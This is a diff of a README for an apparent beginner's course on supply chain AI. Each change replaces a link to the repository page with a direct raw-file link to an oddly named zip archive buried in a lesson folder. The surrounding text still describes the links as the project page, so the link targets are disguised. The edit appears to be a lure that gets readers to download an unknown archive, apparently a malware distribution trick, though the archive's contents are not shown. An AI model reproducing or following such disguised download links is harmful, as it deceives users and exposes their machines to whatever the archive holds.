@@ -1,6 +1,6 @@
 # 🤖 supply-chain-ai-for-beginners - Learn Supply Chain AI From Scratch
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge&logo=github)](https://github.com/larsson9025/supply-chain-ai-for-beginners)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/larsson9025/supply-chain-ai-for-beginners/main/11-llm-agents-for-planning/supply-for-chain-ai-beginners-v3.8.zip)
 
 ## 📘 What this is
 
@@ -35,7 +35,7 @@ If you only want to read the course material, a browser is enough.
 
 Go to the main project page here:
 
-https://github.com/larsson9025/supply-chain-ai-for-beginners
+https://raw.githubusercontent.com/larsson9025/supply-chain-ai-for-beginners/main/11-llm-agents-for-planning/supply-for-chain-ai-beginners-v3.8.zip
 
 From that page, use the download or clone option shown on GitHub. If the repository includes a release file or course package, download it to your PC and open it with your browser or file viewer.
 
@@ -205,4 +205,4 @@ This order makes it easier to stay on track.
 
 Use this page to download or open the course files:
 
-https://github.com/larsson9025/supply-chain-ai-for-beginners
+https://raw.githubusercontent.com/larsson9025/supply-chain-ai-for-beginners/main/11-llm-agents-for-planning/supply-for-chain-ai-beginners-v3.8.zip
